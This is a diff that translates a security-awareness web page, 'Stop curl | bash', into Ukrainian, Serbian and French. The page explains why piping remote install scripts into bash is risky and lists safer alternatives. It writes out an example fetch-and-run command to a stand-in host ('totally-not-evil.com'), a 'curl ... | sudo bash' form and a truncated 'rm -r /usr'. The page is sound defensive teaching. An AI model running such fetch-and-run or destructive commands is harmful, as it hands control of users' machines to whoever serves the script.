@@ -440,7 +440,7 @@
         <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://totally-not-evil.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash</span>
 </div>
-        <p>Вона завантажує шелл-скрипт з інтернету і негайно його виконує. Ви не маєте уявлення що запускається.</p>
+        <p>Вона завантажує шелл-скрипт з інтернету і негайно його виконує. Ви не маєте уявлення що запускається. Ваша команда теж. Ваш аудит-лог теж.</p>
       </section>
 
       <section>
@@ -449,43 +449,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash запускається до завершення завантаження</strong>
+            <p>Канал активний. Bash отримує та виконує рядки в міру їх надходження. Перервіть з&#8217;єднання посередині передачі &#8212; і отримаєте часткове виконання: команда на кшталт <code>rm -r /usr/share/program</code> може скоротитися до <code>rm -r /usr</code>. Команди виконались, прибирання &#8212; ні.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>Сервер знає, що ви використовуєте pipe &#8212; і може брехати</strong>
+            <p>Сервери визначають curl User-Agent або використовують таймінг: надсилають команду <code>sleep</code> на початку скрипту &#8212; якщо bash її виконує, зчитування з pipe призупиняється, curl блокується, і сервер фіксує затримку. Виконання підтверджено. Після цього він віддає інший payload. &#171;Я спочатку прочитаю це в браузері&#187; вас не захистить: те, що ви читаєте, &#8212; не те, що виконується.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>Жодної перевірки цілісності</strong>
+            <p>Ні контрольної суми, ні підпису. Ви одночасно довіряєте DNS, TLS, CDN та джерелу. Скомпрометований CDN або BGP-перехоплення доставлять шкідливе програмне забезпечення непомітно.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>Ви довіряєте більшому, ніж думаєте</strong>
+            <p>Не лише автору. Ви довіряєте реєстратору домену, DNS-провайдеру, CDN, хостингу, кожному CI/CD-конвеєру, що зібрав артефакт, і кожному майбутньому супроводжувачу, хто коли-небудь зробить push до цього репозиторію.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>Ви не можете відтворити те, що виконувалось</strong>
+            <p>URL активний і змінний. Жодного запису про те, що саме виконувалось на вашій машині, не існує &#8212; лише факт, що щось виконувалось.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong>Додайте <code>sudo</code> &#8212; і це кінець</strong>
+            <p><code>curl ... | sudo bash</code> надає права root тому, хто контролює цей URL у конкретний момент. Цей патерн зустрічається в реально опублікованій документації. Часто.</p>
           </div>
         </li>
         </ul>
@@ -493,39 +493,39 @@
 
       <section>
         <h2>З реального життя</h2>
-        <p class="lead">Реальні інсталл-скрипти, проаналізовані у червні 2026.</p>
+        <p class="lead">Реальні інсталл-скрипти, проаналізовані у червні 2026. Це не гіпотетичні загрози.</p>
         <div class="examples">
         <div class="example">
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">менеджер середовища розробника</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">Завантажив бінарник до <strong>/usr/local/bin через sudo</strong> без перевірки цілісності. Якщо потрібна залежність була відсутня, скрипт мовчки завантажував гігабайти додаткових інструментів. Також слідував нерозкритому ланцюжку переадресацій між доменами.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">хмарний інструмент для написання коду</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">URL для встановлення мовчки переадресовував на <strong>live dev branch на GitHub</strong> &#8212; без тегів версій, без pinning. Кожен коміт до цієї гілки змінював те, що отримували користувачі. Те, що виконувалось учора, &#8212; не те, що виконується сьогодні.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">no checksum</span>
             <span class="tag warn">sudo possible</span>
-            <span class="tool">open-source AI agent</span>
+            <span class="tool">відкритий AI-агент</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">Завантажив Python-рантайм, JavaScript-рантайм і повноцінний headless-браузер (~300&#8239;МБ). Може викликати sudo для встановлення системних пакетів. Після видалення основного каталогу системні сліди залишаються.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">асистент для коду від великого виробника заліза</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">Завантажує з пропрієтарного внутрішнього CDN без публічної історії вихідного коду та без контрольної суми. Аудит неможливий, і перевірити отримане не можна.</div>
         </div>
         </div>
       </section>
@@ -534,8 +534,8 @@
         <h2>Як робити правильно</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. Використовуйте справжній пакетний менеджер</h3>
+          <p>Нудний варіант зазвичай правильний. Пакетні менеджери забезпечують цілісність, оновлення та видалення.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -546,8 +546,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. Завантажте, перевірте, потім запустіть</h3>
+          <p>Один додатковий крок. Дає можливість прочитати скрипт і зберігає локальну копію для майбутніх довідок.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -555,19 +555,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. Логуйте все, що виконується</h3>
+          <p>Якщо вже використовуєте pipe &#8212; записуйте, що виконувалось, щоб мати можливість аудиту або відкату.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Примітка</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> відстежує лише команди верхнього рівня. Дочірні процеси та підключені скрипти в лог не потраплять.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. Перевіряйте контрольну суму</h3>
+          <p>Якщо проєкт публікує SHA-256-хеш &#8212; використовуйте його. Обов&#8217;язково на робочих машинах.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -579,10 +579,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>Поширене заперечення</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">&#171;Але я довіряю постачальнику &#8212; значить, все гаразд?&#187;</p>
+          <p class="faq-a">`curl | bash` додає поверхню атаки поверх довіри до постачальника: ви також довіряєте DNS, CDN, хостинг-провайдеру та всім, хто може скомпрометувати URL між моментом публікації та моментом запуску. Пакет, встановлений через пакетний менеджер, проходить додаткові рівні перевірки. Репутація постачальника не робить механізм доставки безпечним.</p>
         </div>
       </section>
 
@@ -598,61 +598,61 @@
       <header>
         <div class="badge">&#9888; Sigurnosni antipattern</div>
         <h1>Stop <code>curl | bash</code></h1>
-        <p class="tagline">Ne biste pokrenuli tuđi kod bez čitanja. Ipak, svaka druga stranica dokumentacije završava ovom komandom.</p>
+        <p class="tagline">Ne biste pokrenuli tu&#273;i kod bez &#269;itanja. Ipak, svaka druga stranica dokumentacije zavr&#353;ava ovom komandom.</p>
       </header>
 
       <section>
         <h2>Problem</h2>
-        <p>Reč je o ovoj komandi:</p>
+        <p>Re&#269; je o ovoj komandi:</p>
         <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://totally-not-evil.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash</span>
 </div>
-        <p>Preuzima shell skriptu sa interneta i odmah je izvršava. Nemate pojma šta se pokreće. Ni vaš tim. Ni vaš audit log.</p>
+        <p>Preuzima shell skriptu sa interneta i odmah je izvr&#353;ava. Nemate pojma &#353;ta se pokre&#263;e. Ni va&#353; tim. Ni va&#353; audit log.</p>
       </section>
 
       <section>
-        <h2>Zašto je loše</h2>
+        <h2>Za&#353;to je lo&#353;e</h2>
         <ul class="reasons">
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash startuje pre nego &#353;to preuzimanje zavr&#353;i</strong>
+            <p>Kanal je aktivan. Bash prima i izvr&#353;ava linije kako pristi&#382;u. Prekinite vezu usred prenosa &#8212; i dobijate parcijalno izvr&#353;avanje: komanda poput <code>rm -r /usr/share/program</code> mo&#382;e se skratiti na <code>rm -r /usr</code>. Komande su se izvr&#353;ile, &#269;i&#353;&#263;enje nije.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>Server zna da koristite pipe &#8212; i mo&#382;e lagati</strong>
+            <p>Serveri detektuju curl User-Agent ili koriste tajming: po&#353;alju komandu <code>sleep</code> na po&#269;etku skripte &#8212; ako bash izvr&#353;ava tu komandu, &#269;itanje iz pipe-a se pauzira, curl blokira, a server prime&#263;uje ka&#353;njenje. Izvr&#353;avanje potvrdjeno. Zatim servira drugi payload. &#171;Pro&#269;ita&#263;u to prvo u browseru&#187; ne &#353;titi vas: ono &#353;to &#269;itate nije ono &#353;to se izvr&#353;ilo.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>Nema provere integriteta</strong>
+            <p>Ni kontrolne sume, ni potpisa. Istovremeno verujete DNS-u, TLS-u, CDN-u i izvoru. Kompromitovani CDN ili BGP otmica dostavlja malver bez ikakvog upozorenja.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>Verujete vi&#353;e nego &#353;to mislite</strong>
+            <p>Ne samo autoru. Verujete registraru domena, DNS provajderu, CDN-u, hostingu, svakom CI/CD pipeline-u koji je izgradio artefakt, i svakom budu&#263;em odr&#382;avaocu koji ikada bude radio push na taj repozitorijum.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>Ne mo&#382;ete reprodukovati &#353;ta se izvr&#353;ilo</strong>
+            <p>URL je aktivan i promenljiv. Ne postoji nikakav zapis o tome &#353;ta je ta&#269;no izvr&#353;eno na va&#353;oj ma&#353;ini &#8212; samo da se ne&#353;to izvr&#353;ilo.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong>Dodajte <code>sudo</code> i gotovo je</strong>
+            <p><code>curl ... | sudo bash</code> daje root pristup onome ko kontroli&#353;e taj URL u tom trenutku. Ovaj obrazac se pojavljuje u stvarno objavljenoj dokumentaciji. &#268;esto.</p>
           </div>
         </li>
         </ul>
@@ -660,23 +660,23 @@
 
       <section>
         <h2>Iz prakse</h2>
-        <p class="lead">Realni install skripti, analizirani u junu 2026. Ovo nisu hipotetičke pretnje.</p>
+        <p class="lead">Realni install skripti, analizirani u junu 2026. Ovo nisu hipoteti&#269;ke pretnje.</p>
         <div class="examples">
         <div class="example">
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">menad&#382;er razvojnog okru&#382;enja</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">Preuzeo binarni fajl u <strong>/usr/local/bin putem sudo</strong> bez provere integriteta. Ako potrebna zavisnost nije bila prisutna, skripta je tiho preuzimala gigabajte dodatnih alata. Takodje je pratila neobjavljeni lanac preusmeravanja izmedju domena.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">alat za kodiranje u oblaku</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">URL za instalaciju je tiho preusmeravao na <strong>live dev branch na GitHub-u</strong> &#8212; bez tagova verzija, bez pin-ovanja. Svaki komit na tu granu menjao je ono &#353;ta korisnici dobijaju. Ono &#353;to se izvr&#353;ilo ju&#269;e nije ono &#353;to se izvr&#353;ava danas.</div>
         </div>
         <div class="example">
           <div class="example-header">
@@ -684,15 +684,15 @@
             <span class="tag warn">sudo possible</span>
             <span class="tool">open-source AI agent</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">Preuzeo Python runtime, JavaScript runtime i potpuni headless browser (~300&#8239;MB). Mo&#382;e pozvati sudo za instalaciju sistemskih paketa. Nakon uklanjanja glavnog direktorijuma, sistemski tragovi ostaju.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">asistent za kod od poznatog proizvodja&#269;a hardvera</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">Preuzima sa vlasni&#269;kog internog CDN-a bez javne istorije izvornog koda i bez kontrolne sume. Nema ni&#269;ega &#353;ta se mo&#382;e auditovati i nema na&#269;ina da se proveri &#353;ta ste primili.</div>
         </div>
         </div>
       </section>
@@ -701,8 +701,8 @@
         <h2>Uradite ovo umesto toga</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. Koristite pravi menad&#382;er paketa</h3>
+          <p>Dosadna opcija je obi&#269;no ispravna. Menad&#382;eri paketa se brinu o integritetu, a&#382;uriranjima i deinstalaciji.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -713,8 +713,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. Preuzmite, pregledajte, pa pokrenite</h3>
+          <p>Jedan korak vi&#353;e. Daje vam &#353;ansu da pro&#269;itate skriptu i &#269;uva lokalnu kopiju za budu&#263;u referencu.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -722,19 +722,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. Bele&#382;ite sve &#353;to se izvr&#353;ava</h3>
+          <p>Ako ve&#263; morate koristiti pipe &#8212; snimite &#353;ta se izvr&#353;ilo kako biste mogli da vr&#353;ite audit ili vra&#263;anje promena.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Napomena</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> prati samo komande na najvi&#353;em nivou. Podprocesi i u&#269;itane skripte ne&#263;e se pojaviti u logu.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. Proverite kontrolnu sumu</h3>
+          <p>Ako projekat objavljuje SHA-256 he&#353;, koristite ga. Neophodno na produkcijskim ma&#353;inama.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -746,16 +746,16 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>Uobi&#269;ajen prigovor</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">&#171;Ali verujem prodavcu, zna&#269;i sve je u redu, zar ne?&#187;</p>
+          <p class="faq-a">Verovati prodavcu je neophodno, ali nije dovoljno. `curl | bash` dodaje napadnu povr&#353;inu na vrh tog poverenja: takodje verujete DNS-u, CDN-u, hosting provajderu i svima koji bi mogli kompromitovati URL izmedju trenutka objavljivanja i trenutka pokretanja. Paket instaliran putem menad&#382;era paketa prolazi kroz dodatne slojeve verifikacije. Reputacija prodavca ne &#269;ini mehanizam isporuke bezbednim.</p>
         </div>
       </section>
 
       <footer>
         <p>Inspirisano <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> i <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.</p>
-        <p>Podelite ovu stranicu sledeći put kada neko nalepi <code>curl | bash</code> u timski chat.</p>
+        <p>Podelite ovu stranicu slede&#263;i put kada neko nalepi <code>curl | bash</code> u timski chat.</p>
       </footer>
     </div>
   </div>
@@ -783,43 +783,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash d&#233;marre avant la fin du t&#233;l&#233;chargement</strong>
+            <p>Le tube est actif. Bash re&#231;oit et ex&#233;cute les lignes au fur et &#224; mesure. Coupez la connexion en plein transfert: une commande comme <code>rm -r /usr/share/program</code> peut &#234;tre tronqu&#233;e en <code>rm -r /usr</code>. Les commandes ont &#233;t&#233; ex&#233;cut&#233;es, le nettoyage, non.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>Le serveur sait que vous utilisez un tube &#8212; et peut mentir</strong>
+            <p>Les serveurs d&#233;tectent le User-Agent de curl ou utilisent le timing: envoyer une commande <code>sleep</code> en d&#233;but de script &#8212; si bash l&#8217;ex&#233;cute, les lectures du tube marquent une pause, curl se bloque, et le serveur observe le d&#233;lai. Ex&#233;cution confirm&#233;e. Ensuite, il sert un payload diff&#233;rent. &#171;Je vais d&#8217;abord le lire dans le navigateur&#187; ne vous prot&#232;ge pas: ce que vous lisez n&#8217;est pas ce qui s&#8217;est ex&#233;cut&#233;.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>Aucune v&#233;rification d&#8217;int&#233;grit&#233;</strong>
+            <p>Ni somme de contr&#244;le, ni signature. Vous faites confiance simultan&#233;ment au DNS, au TLS, au CDN et &#224; l&#8217;origine. Un CDN compromis ou un d&#233;tournement BGP livre silencieusement des logiciels malveillants.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>Vous faites confiance &#224; plus que vous ne le pensez</strong>
+            <p>Pas seulement &#224; l&#8217;auteur. Vous faites confiance au registrar de domaine, au fournisseur DNS, au CDN, &#224; l&#8217;h&#233;bergement, &#224; chaque pipeline CI/CD qui a construit l&#8217;artefact, et &#224; chaque futur mainteneur qui poussera un jour sur ce d&#233;p&#244;t.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>Vous ne pouvez pas reproduire ce qui s&#8217;est ex&#233;cut&#233;</strong>
+            <p>L&#8217;URL est active et mutable. Il n&#8217;existe aucune trace de ce qui s&#8217;est exactement ex&#233;cut&#233; sur votre machine &#8212; seulement que quelque chose l&#8217;a fait.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong>Ajoutez <code>sudo</code> et c&#8217;est termin&#233;</strong>
+            <p><code>curl ... | sudo bash</code> accorde les droits root &#224; quiconque contr&#244;le cette URL &#224; cet instant. Ce sch&#233;ma appara&#238;t dans de vraies documentations publi&#233;es. Souvent.</p>
           </div>
         </li>
         </ul>
@@ -833,33 +833,33 @@
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">gestionnaire d&#8217;environnement d&#233;veloppeur</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">T&#233;l&#233;charge un binaire dans <strong>/usr/local/bin via sudo</strong> sans v&#233;rification d&#8217;int&#233;grit&#233;. Si une d&#233;pendance requise &#233;tait absente, le script t&#233;l&#233;chargeait silencieusement des gigaoctets d&#8217;outils suppl&#233;mentaires. Il suivait &#233;galement une cha&#238;ne de redirections non divulgu&#233;e entre domaines.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">outil de d&#233;veloppement dans le cloud</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">L&#8217;URL d&#8217;installation redirige silencieusement vers une <strong>branche de d&#233;veloppement active sur GitHub</strong> &#8212; sans tag de version, sans &#233;pinglage. Chaque commit sur cette branche modifiait ce que les utilisateurs recevaient. Ce qui s&#8217;est ex&#233;cut&#233; hier n&#8217;est pas ce qui s&#8217;ex&#233;cute aujourd&#8217;hui.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">no checksum</span>
             <span class="tag warn">sudo possible</span>
-            <span class="tool">open-source AI agent</span>
+            <span class="tool">agent IA open-source</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">T&#233;l&#233;charge un environnement d&#8217;ex&#233;cution Python, un environnement JavaScript et un navigateur headless complet (~300&#8239;Mo). Peut invoquer sudo pour installer des paquets syst&#232;me. Apr&#232;s suppression du r&#233;pertoire principal, des traces au niveau syst&#232;me subsistent.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">assistant de code d&#8217;un grand fabricant de mat&#233;riel</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
